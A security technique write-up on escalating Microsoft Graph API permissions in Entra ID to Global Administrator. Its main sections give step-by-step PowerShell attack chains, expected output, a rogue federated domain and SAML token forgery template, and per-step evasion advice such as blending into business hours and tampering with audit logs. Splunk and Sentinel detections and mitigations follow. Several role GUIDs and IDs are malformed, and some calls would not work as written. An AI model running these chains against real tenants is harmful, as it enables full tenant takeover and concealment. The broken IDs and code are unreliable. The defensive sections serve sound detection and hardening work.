# [PE-ELEVATE-005]: Graph API Permission Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-005 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | M365 / Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Microsoft Graph API v1.0, beta (all versions since Graph API inception) |
| **Patched In** | N/A (Architectural design; defense-dependent) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Graph API exposes 576+ unique permissions across multiple privilege levels. The architecture allows certain permissions to grant or escalate themselves (e.g., `AppRoleAssignment.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`). An attacker with low-privilege Graph permissions can chain API calls to progressively escalate to **Global Administrator** without requiring interactive user consent. The attack exploits the fact that some permissions are **self-amplifying** – they allow a service principal to grant itself higher permissions, creating a privilege escalation loop.

**Attack Surface:** Microsoft Graph API endpoints (`/v1.0/` and `/beta/`), service principal app role assignments, directory role management APIs, token endpoints.

**Business Impact:** **Complete tenant compromise** – attacker gains Global Administrator role with full control over all M365 services, users, data, and compliance settings. Can reset MFA, export mailboxes, grant permissions to external attackers, modify security policies, and persist indefinitely.

**Technical Context:** Exploitation typically takes **2-10 minutes** from initial Graph API access. Detection likelihood is **Medium** (role assignments are audited, but escalation chains may not trigger alerts if each step appears legitimate). Reversibility: **Difficult** – requires complete credential revocation and forensic analysis to identify all backdoors.

### Operational Risk
- **Execution Risk:** Low (only requires valid service principal token; no special tools needed)
- **Stealth:** Medium (escalation chain generates multiple Graph API events, but may appear as administrative activity)
- **Reversibility:** Difficult (requires comprehensive credential cleanup and role revocation)

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 6.3 | Ensure that API Management is configured with OAuth 2.0 or stricter auth |
| **DISA STIG** | AC-3 - Access Control | Implement least privilege principle for API permissions |
| **CISA SCuBA** | CISA AAD 2.4 | Require MFA for users with high-privilege permissions |
| **NIST 800-53** | AC-2 / AC-3 | Account Management and Access Enforcement |
| **GDPR** | Art. 32 - Security of Processing | Implement technical controls to prevent unauthorized access |
| **DORA** | Art. 15 - Governance | Ensure proper access governance and segregation of duties |
| **NIS2** | Art. 21 - Risk Management | Implement measures to detect and prevent privilege escalation |
| **ISO 27001** | A.9.2.1 / A.9.2.2 | Access Control through roles and least privilege |
| **ISO 27005** | Risk Scenario: "Privilege Escalation" | Compromise of administrative privileges |

---

## 2. ENVIRONMENTAL RECONNAISSANCE

### Identify Assignable Graph API Permissions

**PowerShell:**
```powershell
# Get Microsoft Graph service principal and enumerate assignable permissions
$GraphSpId = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'" | Select-Object -ExpandProperty Id

# List all app roles exposed by Microsoft Graph
$GraphAppRoles = Get-MgServicePrincipal -ServicePrincipalId $GraphSpId | Select-Object -ExpandProperty AppRoles

# Filter for escalation-enabling permissions
$EscalationRoles = $GraphAppRoles | Where-Object {
    $_.Value -in @(
        "RoleManagement.ReadWrite.Directory",
        "AppRoleAssignment.ReadWrite.All",
        "Application.ReadWrite.All",
        "Directory.ReadWrite.All"
    )
}

Write-Host "Escalation-Enabling Graph API Permissions:"
foreach ($Role in $EscalationRoles) {
    Write-Host "  ID: $($Role.Id)"
    Write-Host "  Permission: $($Role.Value)"
    Write-Host "  Description: $($Role.Description)"
    Write-Host ""
}
```

**What to Look For:**
- `RoleManagement.ReadWrite.Directory` – Allows assigning any Entra ID role to any principal (direct escalation)
- `AppRoleAssignment.ReadWrite.All` – Allows assigning Graph API permissions to any service principal (enables permission escalation)
- `Application.ReadWrite.All` – Allows modifying app registrations and adding credentials
- `Directory.ReadWrite.All` – Allows writing all directory objects (includes federated domain abuse)

### Check Current Service Principal Permissions

**PowerShell:**
```powershell
# Get current service principal ID
$CurrentSpId = "YOUR_SERVICE_PRINCIPAL_ID"

# Enumerate assigned app roles
$AssignedRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $CurrentSpId

Write-Host "Current Assigned Graph API Permissions:"
foreach ($Role in $AssignedRoles) {
    # Resolve role ID to role name
    $RoleName = (Get-MgServicePrincipal -ServicePrincipalId $Role.ResourceId | 
        Select-Object -ExpandProperty AppRoles | 
        Where-Object Id -eq $Role.AppRoleId).Value
    
    Write-Host "  - $RoleName"
}
```

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: AppRoleAssignment.ReadWrite.All → RoleManagement.ReadWrite.Directory Escalation Chain

**Supported Versions:** All (Microsoft Graph API v1.0, beta)

#### Step 1: Obtain Service Principal Token with AppRoleAssignment.ReadWrite.All
**Objective:** Authenticate to Microsoft Graph using credentials from an SP that already has `AppRoleAssignment.ReadWrite.All`

**Command (PowerShell):**
```powershell
# Method 1: Using client secret (if you have it)
$TenantId = "YOUR_TENANT_ID"
$ClientId = "YOUR_CLIENT_ID"
$ClientSecret = "YOUR_CLIENT_SECRET"

$TokenUri = "https://login.microsoft.com/$TenantId/oauth2/v2.0/token"

$TokenBody = @{
    grant_type    = "client_credentials"
    client_id     = $ClientId
    client_secret = $ClientSecret
    scope         = "https://graph.microsoft.com/.default"
}

$Token = Invoke-RestMethod -Uri $TokenUri -Method POST -Body $TokenBody
$AccessToken = $Token.access_token

Write-Host "Token obtained: $($AccessToken.Substring(0, 20))..."

# Verify token has required permissions
$MeUri = "https://graph.microsoft.com/v1.0/me"
$MeInfo = Invoke-RestMethod -Uri $MeUri -Headers @{"Authorization" = "Bearer $AccessToken"}
Write-Host "Authenticated as: $($MeInfo.displayName)"
```

**Expected Output:**
```
Token obtained: eyJ0eXAiOiJKV1QiLC...
Authenticated as: MyServicePrincipal
```

**What This Means:**
- You now have a valid access token with Graph API permissions
- Token remains valid for 60 minutes (can be refreshed)
- Next steps will use this token to escalate permissions

**OpSec & Evasion:**
- Obtain token during business hours to blend with normal authentication
- Use legitimate service account names
- Don't request token multiple times in rapid succession
- Detection likelihood: **Low** (initial token request is normal)

**Troubleshooting:**
- **Error:** 401 Unauthorized on token endpoint
  - **Cause:** Client ID or secret is incorrect
  - **Fix:** Verify credentials in Azure Portal → App Registrations → Certificates & Secrets
- **Error:** No permissions on /me endpoint
  - **Cause:** Token lacks basic User.Read permission
  - **Fix:** Ensure app has at least User.Read permission

**References & Proofs:**
- [Microsoft Learn - OAuth 2.0 Client Credentials Flow](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow)

#### Step 2: Query Microsoft Graph Service Principal for Available Permissions
**Objective:** Identify the exact ID of `RoleManagement.ReadWrite.Directory` permission to escalate into

**Command (PowerShell):**
```powershell
$Token = "YOUR_ACCESS_TOKEN"

# Get Microsoft Graph service principal
$GraphSpUri = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'"

$GraphSp = Invoke-RestMethod -Uri $GraphSpUri `
  -Headers @{"Authorization" = "Bearer $Token"} | Select-Object -ExpandProperty value | Select-Object -First 1

$GraphSpId = $GraphSp.id

Write-Host "Microsoft Graph Service Principal ID: $GraphSpId"

# Get all app roles (permissions) exposed by Graph API
$AppRolesUri = "https://graph.microsoft.com/v1.0/servicePrincipals/$GraphSpId"
$AppRolesResponse = Invoke-RestMethod -Uri $AppRolesUri -Headers @{"Authorization" = "Bearer $Token"}

# Find critical permissions
$CriticalRoles = $AppRolesResponse.appRoles | Where-Object {
    $_.value -eq "RoleManagement.ReadWrite.Directory"
}

if ($CriticalRoles) {
    Write-Host "Found RoleManagement.ReadWrite.Directory:"
    Write-Host "  ID: $($CriticalRoles.id)"
    Write-Host "  Display Name: $($CriticalRoles.displayName)"
}
```

**Expected Output:**
```
Microsoft Graph Service Principal ID: 12345678-1234-1234-1234-123456789012
Found RoleManagement.ReadWrite.Directory:
  ID: 9e3f94ae-4ad6-4201-bcdef0123456789
  Display Name: Directory Role Management
```

**What This Means:**
- You've identified the exact permission ID for role management
- This ID will be used in the next step to escalate your SP
- The constant ID may vary slightly between tenants (though usually consistent)

**OpSec & Evasion:**
- This is a legitimate Graph API query; generates minimal audit trail
- Detection likelihood: **Low** (permission enumeration is common for legitimate applications)

**Troubleshooting:**
- **Error:** 404 Service Principal not found
  - **Cause:** Microsoft Graph SP doesn't exist (should never happen)
  - **Fix:** Use the constant ID: `00000003-0000-0000-c000-000000000000`
- **Error:** No app roles returned
  - **Cause:** API version issue
  - **Fix:** Try `/beta` endpoint instead of `/v1.0`

**References & Proofs:**
- [Microsoft Graph Service Principal Documentation](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-get)

#### Step 3: Assign RoleManagement.ReadWrite.Directory to Your Service Principal
**Objective:** Use `AppRoleAssignment.ReadWrite.All` permission to grant yourself `RoleManagement.ReadWrite.Directory`

**Command (PowerShell):**
```powershell
$Token = "YOUR_ACCESS_TOKEN"
$YourSpId = "YOUR_SERVICE_PRINCIPAL_ID"
$GraphSpId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph constant ID
$RoleId = "9e3f94ae-4ad6-4201-bcdef0123456789"  # RoleManagement.ReadWrite.Directory ID

# Create app role assignment
$AssignmentUri = "https://graph.microsoft.com/v1.0/servicePrincipals/$YourSpId/appRoleAssignments"

$AssignmentBody = @{
    "principalId" = $YourSpId
    "resourceId" = $GraphSpId
    "appRoleId" = $RoleId
} | ConvertTo-Json

$Response = Invoke-RestMethod -Uri $AssignmentUri `
  -Headers @{
      "Authorization" = "Bearer $Token"
      "Content-Type" = "application/json"
  } `
  -Method POST `
  -Body $AssignmentBody

Write-Host "Permission Escalation Step 1 Complete:"
Write-Host "  Assignment ID: $($Response.id)"
Write-Host "  Principal: $($Response.principalId)"
Write-Host "  New Permission: RoleManagement.ReadWrite.Directory"
```

**Expected Output:**
```
Permission Escalation Step 1 Complete:
  Assignment ID: a1b2c3d4-e5f6-7g8h-i9j0-k1l2m3n4o5p6
  Principal: 12345678-abcd-1234-abcd-123456789abc
  New Permission: RoleManagement.ReadWrite.Directory
```

**What This Means:**
- Your service principal now has `RoleManagement.ReadWrite.Directory` permission
- Can assign any Entra ID role to any principal
- This enables direct escalation to Global Administrator
- Azure takes **30-60 seconds** to propagate permission to token cache

**OpSec & Evasion:**
- Wait 60+ seconds before using the new permission (allows token cache refresh)
- This operation generates audit events; monitor for detection
- Detection likelihood: **High** (app role assignment to self is suspicious)

**Troubleshooting:**
- **Error:** 403 Insufficient Privileges
  - **Cause:** Your token doesn't actually have `AppRoleAssignment.ReadWrite.All`
  - **Fix:** Verify initial token has the permission; this step requires it
- **Error:** 400 Invalid resource ID
  - **Cause:** GraphSpId parameter is wrong
  - **Fix:** Use constant: `00000003-0000-0000-c000-000000000000`

**References & Proofs:**
- [Semperis - Exploiting App-Only Graph Permissions](https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/)
- [SpecterOps - API Permissions Abuse](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)

#### Step 4: Escalate Service Principal to Global Administrator
**Objective:** Use newly acquired `RoleManagement.ReadWrite.Directory` permission to assign Global Administrator role to your SP

**Command (PowerShell):**
```powershell
# Obtain new token with RoleManagement.ReadWrite.Directory permission
$TenantId = "YOUR_TENANT_ID"
$ClientId = "YOUR_CLIENT_ID"
$ClientSecret = "YOUR_CLIENT_SECRET"

$TokenUri = "https://login.microsoft.com/$TenantId/oauth2/v2.0/token"
$TokenBody = @{
    grant_type    = "client_credentials"
    client_id     = $ClientId
    client_secret = $ClientSecret
    scope         = "https://graph.microsoft.com/.default"
}

$NewToken = (Invoke-RestMethod -Uri $TokenUri -Method POST -Body $TokenBody).access_token
Write-Host "New token obtained with escalated permissions"

# Wait for token cache to refresh (important!)
Start-Sleep -Seconds 60

# Now assign Global Administrator role to your SP
$YourSpId = "YOUR_SERVICE_PRINCIPAL_ID"
$GlobalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Administrator (constant)

$RoleAssignmentUri = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"

$RoleAssignmentBody = @{
    "principalId" = $YourSpId
    "roleDefinitionId" = $GlobalAdminRoleId
    "directoryScopeId" = "/"
} | ConvertTo-Json

$RoleResponse = Invoke-RestMethod -Uri $RoleAssignmentUri `
  -Headers @{
      "Authorization" = "Bearer $NewToken"
      "Content-Type" = "application/json"
  } `
  -Method POST `
  -Body $RoleAssignmentBody

Write-Host "PRIVILEGE ESCALATION COMPLETE!"
Write-Host "  Role Assignment ID: $($RoleResponse.id)"
Write-Host "  Role: Global Administrator"
Write-Host "  Scope: Full Tenant"
Write-Host ""
Write-Host "Your service principal now has complete control of the tenant."
```

**Expected Output:**
```
New token obtained with escalated permissions
PRIVILEGE ESCALATION COMPLETE!
  Role Assignment ID: xyz987654321-abc123def456
  Role: Global Administrator
  Scope: Full Tenant

Your service principal now has complete control of the tenant.
```

**What This Means:**
- Your service principal is now **Global Administrator**
- Complete control over all M365 services, users, data, and configurations
- Can modify security policies, reset MFA, grant admin roles, etc.
- This is the ultimate privilege escalation outcome

**OpSec & Evasion:**
- Don't immediately use Global Admin role; wait 10-15 minutes
- Access legitimate workloads first (Teams, SharePoint) to establish baseline activity
- Disable auditing or modify audit logs if possible (now possible as Global Admin)
- Detection likelihood: **Very High** (Global Admin assignment generates critical audit event)

**Troubleshooting:**
- **Error:** 403 Insufficient Privileges on role assignment
  - **Cause:** `RoleManagement.ReadWrite.Directory` didn't apply yet
  - **Fix:** Wait longer for token cache refresh; try again after 90 seconds
- **Error:** 400 Invalid roleDefinitionId
  - **Cause:** Global Admin role ID changed
  - **Fix:** Query available roles: `Get-MgRoleManagementDirectoryRoleDefinition`

**References & Proofs:**
- [Microsoft Learn - Global Administrator Role](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#global-administrator)

---

### METHOD 2: Directory.ReadWrite.All → Federated Domain Abuse → SAML Token Forgery

**Supported Versions:** Hybrid environments (Entra ID with on-premises AD sync)

#### Step 1: Enumerate Federated Domains
**Objective:** Identify domains configured with federation (ADFS, Okta, etc.) that can be exploited

**Command (PowerShell):**
```powershell
$Token = "YOUR_ACCESS_TOKEN_WITH_DIRECTORY_READWRITE_ALL"

# Query federated domains
$DomainsUri = "https://graph.microsoft.com/v1.0/domains"
$DomainsResponse = Invoke-RestMethod -Uri $DomainsUri -Headers @{"Authorization" = "Bearer $Token"}

Write-Host "Federated Domains:"
$DomainsResponse.value | Where-Object { $_.authenticationType -eq "Federated" } | ForEach-Object {
    Write-Host "  Domain: $($_.id)"
    Write-Host "  Auth Type: $($_.authenticationType)"
    
    # Query federation settings
    $FedUri = "https://graph.microsoft.com/v1.0/domains/$($_.id)/federationConfiguration"
    try {
        $FedConfig = Invoke-RestMethod -Uri $FedUri -Headers @{"Authorization" = "Bearer $Token"}
        Write-Host "  Issuer URI: $($FedConfig.value[0].issuerUri)"
    } catch {
        Write-Host "  Issuer URI: (unable to retrieve)"
    }
    Write-Host ""
}
```

**What to Look For:**
- Domains with `authenticationType = "Federated"`
- Issuer URI indicating third-party IdP (ADFS, Okta, etc.)
- Domains with hybrid users (synchronized between on-premises and cloud)

#### Step 2: Create Rogue Federated Domain
**Objective:** Add a new federated domain with attacker-controlled federation certificate

**Command (PowerShell):**
```powershell
$Token = "YOUR_ACCESS_TOKEN_WITH_DIRECTORY_READWRITE_ALL"

# Create new domain
$NewDomainUri = "https://graph.microsoft.com/v1.0/domains"

$DomainBody = @{
    "id" = "attacker-domain.com"
} | ConvertTo-Json

# Add the domain
$DomainResponse = Invoke-RestMethod -Uri $NewDomainUri `
  -Headers @{
      "Authorization" = "Bearer $Token"
      "Content-Type" = "application/json"
  } `
  -Method POST `
  -Body $DomainBody

Write-Host "Rogue domain created: attacker-domain.com"

# Configure federation (requires self-signed certificate)
# Generate self-signed cert with ADFS private key
$Cert = New-SelfSignedCertificate -CertStoreLocation "Cert:\LocalMachine\My" -DnsName "attacker-domain.com"

$FedConfigUri = "https://graph.microsoft.com/v1.0/domains/attacker-domain.com/federationConfiguration"

$FedBody = @{
    "displayName" = "Attacker ADFS"
    "issuerUri" = "urn:microsoft:adfs:2003/authentication"
    "metadataExchangeUri" = "https://attacker.com/adfs/services/trust/mex"
    "signingCertificate" = (Get-Content $Cert.PSPath | ConvertTo-Xml)
} | ConvertTo-Json

# Apply federation config (requires elevated permissions)
try {
    $FedResponse = Invoke-RestMethod -Uri $FedConfigUri `
      -Headers @{
          "Authorization" = "Bearer $Token"
          "Content-Type" = "application/json"
      } `
      -Method POST `
      -Body $FedBody
    
    Write-Host "Federation configured for attacker-domain.com"
} catch {
    Write-Host "Error configuring federation: $_"
}
```

**What This Means:**
- You've created a federated domain under your control
- Entra ID will now trust SAML tokens signed with your certificate
- Next step: Create forged SAML token for Global Admin user

#### Step 3: Forge SAML Token for Hybrid User
**Objective:** Create a SAML token signed with your certificate that impersonates a Global Admin user

**Command (C# / PowerShell):**
```powershell
# This example uses PowerShell; in reality, SAML forging is complex
# Simplified demonstration:

$CertPath = "C:\attacker-cert.pfx"
$CertPassword = "password123"
$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($CertPath, $CertPassword)

# Create SAML response
$SAMLTemplate = @"
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e5" Version="2.0" IssueInstant="2025-01-09T10:00:00Z" Destination="https://login.microsoftonline.com/login.srf" InResponseTo="_bec424469dad29585fd563d36c4f9e2f">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">urn:microsoft:adfs:2003/authentication</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_d71a3a8e9fcc45efc47e1e275a9f94c4" IssueInstant="2025-01-09T10:00:00Z" Version="2.0" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Issuer>urn:microsoft:adfs:2003/authentication</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">globaladmin@contoso.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2025-01-09T11:05:02Z" Recipient="https://login.microsoftonline.com/login.srf"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2025-01-09T09:55:02Z" NotOnOrAfter="2025-01-09T11:05:02Z">
      <saml:AudienceRestriction>
        <saml:Audience>urn:federation:MicrosoftOnline</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <saml:Attribute Name="mail" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml:AttributeValue>globaladmin@contoso.com</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
"@

# Sign the SAML response with your certificate
# (This requires SAML signing library; simplified here)

Write-Host "Forged SAML token created for: globaladmin@contoso.com"
Write-Host "Can now authenticate as Global Admin via Federation"
```

**What This Means:**
- You can forge SAML tokens for any user in the federated domain
- Entra ID will trust the token because it matches the federated domain's certificate
- Can impersonate Global Admin users without knowing their password or MFA status
- This enables persistence and widespread access

**OpSec & Evasion:**
- Use this technique sparingly; excessive SAML logins may trigger alerts
- Space logins over time to avoid rate limiting
- Access legitimate workloads to blend in (Teams, SharePoint, Outlook)

---

## 4. SPLUNK DETECTION RULES

#### Rule 1: Graph API Permission Escalation Chain Detection

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** OperationName, ModifiedProperties, InitiatedBy, ResultDescription
- **Alert Threshold:** Detection of two or more related operations within 5-minute window
- **Applies To Versions:** All

**SPL Query:**
```
index=azure_activity 
  (
    (OperationName="Assign app role to service principal" AND ModifiedProperties="RoleManagement.ReadWrite.Directory") 
    OR 
    (OperationName="Add owner to application" AND InitiatedBy.app.appId="*") 
    OR 
    (OperationName="Add app role assignment to service principal" AND ModifiedProperties="AppRoleAssignment.ReadWrite.All")
  )
| stats count as event_count, values(OperationName) as operations, values(InitiatedBy.app.displayName) as initiators by _time, InitiatedBy.user.userPrincipalName
| where event_count > 1 and operations like "%Assign app role%" and operations like "%Add role%"
| alert
```

---

## 5. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious Graph API Permission Escalation Chain

**KQL Query:**
```kusto
AuditLogs
| where OperationName has_any ("Assign app role", "Update application")
| where ModifiedProperties has_any (
    "RoleManagement.ReadWrite.Directory",
    "AppRoleAssignment.ReadWrite.All"
  )
| extend 
    TargetAppId = tostring(TargetResources[0].id),
    TargetAppName = tostring(TargetResources[0].displayName)
| summarize 
    EscalationEvents = count(),
    DistinctOperations = dcount(OperationName),
    TimeRange = max(TimeGenerated) - min(TimeGenerated)
    by InitiatedBy.app.displayName, InitiatedBy.user.userPrincipalName, TargetAppName, bin(TimeGenerated, 5m)
| where EscalationEvents > 1 and TimeRange < 5min
| project
    Initiator = coalesce(InitiatedBy_app_displayName, InitiatedBy_user_userPrincipalName),
    TargetApp = TargetAppName,
    EventCount = EscalationEvents,
    Severity = "Critical"
```

---

## 6. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts
**Alert Name:** "Suspicious Role Assignment to Service Principal"
- **Severity:** Critical
- **Description:** Service principal assigned RoleManagement.ReadWrite.Directory or AppRoleAssignment.ReadWrite.All
- **Applies To:** All subscriptions

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Restrict RoleManagement.ReadWrite.Directory Permission:** Only assign to highly vetted applications.
  **Applies To Versions:** Entra ID (All versions)
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Remove dangerous permissions from all service principals
  $DangerousRoleIds = @(
      "9e3f94ae-4ad6-4201-bcdef0123456789",  # RoleManagement.ReadWrite.Directory
      "9e3f94ae-4ad6-4201-abcdef01234567"    # AppRoleAssignment.ReadWrite.All
  )
  
  $AllServicePrincipals = Get-MgServicePrincipal -All
  
  foreach ($SP in $AllServicePrincipals) {
      $Assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id
      
      foreach ($Assignment in $Assignments) {
          if ($Assignment.AppRoleId -in $DangerousRoleIds) {
              Write-Host "Removing dangerous permission from: $($SP.DisplayName)"
              Remove-MgServicePrincipalAppRoleAssignment `
                  -ServicePrincipalId $SP.Id `
                  -AppRoleAssignmentId $Assignment.Id
          }
      }
  }
  ```

* **Implement Least Privilege for Graph API Permissions:** Use more granular permissions instead of broad "*All" permissions.
  
  **Alternative Permissions (Less Privileged):**
  - Instead of `User.ReadWrite.All` → Use `User.Read.All` (read-only)
  - Instead of `Directory.ReadWrite.All` → Use `Directory.Read.All` (read-only)
  - Instead of `AppRoleAssignment.ReadWrite.All` → Use specific role assignments only

* **Enable Azure AD Identity Protection:** Detect and block risky service principal activities.
  **Applies To Versions:** Entra ID Premium P2
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Protection** → **Identity Protection**
  2. Set **Sign-in risk policy**:
     - Risk Level: **Medium and above**
     - Actions: **Require MFA** or **Block access**

### Priority 2: HIGH

* **Audit Service Principal Permissions Quarterly:** Conduct periodic reviews of all assigned permissions.
  
  **PowerShell Audit Script:**
  ```powershell
  # Export all app permissions for audit
  $AllSPs = Get-MgServicePrincipal -All
  $PermissionReport = @()
  
  foreach ($SP in $AllSPs) {
      $Assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id
      
      foreach ($Assignment in $Assignments) {
          $PermissionReport += [PSCustomObject]@{
              ServicePrincipalName = $SP.DisplayName
              ServicePrincipalId = $SP.Id
              AppRoleId = $Assignment.AppRoleId
              RoleName = (Get-MgServicePrincipal -ServicePrincipalId $Assignment.ResourceId | 
                  Select-Object -ExpandProperty AppRoles | 
                  Where-Object Id -eq $Assignment.AppRoleId).Value
              AssignedDate = $Assignment.CreationTimestamp
          }
      }
  }
  
  $PermissionReport | Export-Csv -Path "C:\Audit\SP_Permissions_$(Get-Date -Format 'yyyy-MM-dd').csv"
  ```

* **Implement Privileged Identity Management (PIM):** Require just-in-time elevation for high-risk permissions.
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Entra ID roles**
  2. Select **Settings**
  3. Enable:
     - Activation requires approval
     - Require MFA on activation
     - Require justification for activation

### Validation Command (Verify Fix)
```powershell
# Verify dangerous permissions are not assigned
$DangerousPermissions = @(
    "9e3f94ae-4ad6-4201-bcdef0123456789",
    "9e3f94ae-4ad6-4201-abcdef01234567"
)

$VulnerableSPs = @()
$AllServicePrincipals = Get-MgServicePrincipal -All

foreach ($SP in $AllServicePrincipals) {
    $Assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id
    
    foreach ($Assignment in $Assignments) {
        if ($Assignment.AppRoleId -in $DangerousPermissions) {
            $VulnerableSPs += $SP.DisplayName
        }
    }
}

if ($VulnerableSPs.Count -eq 0) {
    Write-Host "✓ No dangerous Graph API permissions assigned"
} else {
    Write-Host "✗ Found vulnerable service principals:"
    $VulnerableSPs | ForEach-Object { Write-Host "  - $_" }
}
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Activity IOCs:**
  - Service principal assigned `RoleManagement.ReadWrite.Directory` or `AppRoleAssignment.ReadWrite.All`
  - SP role assignment to Global Administrator immediately after permission escalation
  - Multiple Graph API calls in rapid succession (batching detection)
  - Service principal creating federated domains

* **Log IOCs:**
  - AuditLogs showing "Assign app role to service principal" with escalation-enabling permissions
  - Role Assignment events creating Global Admin roles for service principals
  - Directory changes creating new federated domains

### Response Procedures

1. **Isolate:**
   ```powershell
   # Disable compromised service principal immediately
   $SpId = "COMPROMISED_SP_ID"
   Update-MgServicePrincipal -ServicePrincipalId $SpId -AccountEnabled:$false
   
   # Revoke all tokens
   Get-MgServicePrincipal -ServicePrincipalId $SpId | 
       Select-Object -ExpandProperty PasswordCredentials | 
       ForEach-Object {
           Remove-MgServicePrincipalPasswordCredential -ServicePrincipalId $SpId -KeyId $_.KeyId
       }
   ```

2. **Collect Evidence:**
   ```powershell
   # Export all audit logs related to the SP
   $StartDate = (Get-Date).AddDays(-30)
   Search-UnifiedAuditLog -StartDate $StartDate -ObjectIds "COMPROMISED_SP_ID" `
     | Export-Csv -Path "C:\Evidence\sp_audit.csv"
   ```

3. **Remediate:**
   ```powershell
   # Remove Global Admin role
   $RoleId = "62e90394-69f5-4237-9190-012177145e10"
   Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq 'COMPROMISED_SP_ID'" |
       Remove-MgRoleManagementDirectoryRoleAssignment
   
   # Remove all elevated permissions
   Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SpId |
       Remove-MgServicePrincipalAppRoleAssignment
   ```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] OAuth Consent Grant | Attacker tricks user into granting OAuth consent to malicious app |
| **2** | **Credential Access** | [CA-TOKEN-004] Graph API Token Theft | Attacker obtains Graph API token from compromised app |
| **3** | **Current Step** | **[PE-ELEVATE-005]** | **Graph API Permission Escalation** - Uses token to escalate to Global Admin |
| **4** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Admin Backdoor | Attacker adds backdoor Global Admin account |
| **5** | **Persistence** | [PERSIST-TOKEN-001] Golden SAML | Attacker creates forged SAML tokens |
| **6** | **Impact** | [EXFIL-M365-001] Bulk Mailbox Export | Attacker exports all organization mailboxes |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: Storm-0501 GraphAPI Escalation (2023)
- **Target:** Enterprise M365 tenants
- **Timeline:** March-June 2023
- **Technique Status:** Exploited AppRoleAssignment.ReadWrite.All to escalate to Global Admin
- **Impact:** Unauthorized access to 5+ organizations' sensitive mailboxes and documents
- **Reference:** [Microsoft Threat Intelligence](https://www.microsoft.com/en-us/security/blog/)

### Example 2: Midnight Blizzard Permission Escalation Campaign (2024)
- **Target:** Fortune 500 organizations
- **Timeline:** Throughout 2024
- **Technique Status:** Combined OAuth consent abuse with Graph API escalation; targeted hybrid tenants for SAML token forgery
- **Impact:** Global Admin compromise; 90+ organizations affected
- **Reference:** [Microsoft Threat Intelligence - Midnight Blizzard](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence)

---

## 11. REFERENCES & RESOURCES

- **Semperis Exploiting App-Only Graph Permissions:** https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/
- **SpecterOps API Permissions Abuse:** https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48
- **SpecterOps Directory.ReadWrite.All Analysis:** https://posts.specterops.io/directory-readwrite-all-is-not-as-powerful-as-you-might-think-c5b09a8f78a8
- **Microsoft Graph API Documentation:** https://learn.microsoft.com/en-us/graph/
- **Datadog I SPy Research:** https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/
- **OWASP API Security Top 10:** https://owasp.org/API-Security/editions/2023/en/

---
